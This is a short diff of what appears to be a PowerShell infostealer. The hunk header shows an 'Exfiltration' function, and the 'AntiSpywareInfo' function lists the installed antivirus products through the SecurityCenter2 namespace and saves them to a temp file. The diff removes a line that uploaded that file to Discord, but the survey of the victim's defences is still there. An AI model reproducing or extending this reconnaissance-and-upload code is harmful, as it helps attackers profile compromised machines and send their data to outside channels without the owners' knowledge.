@@ -111,8 +111,6 @@ function Exfiltration {
 function AntiSpywareInfo {
     Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
 
-    # Upload AntiSpyware.txt to Discord
-    Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
 
 }
 
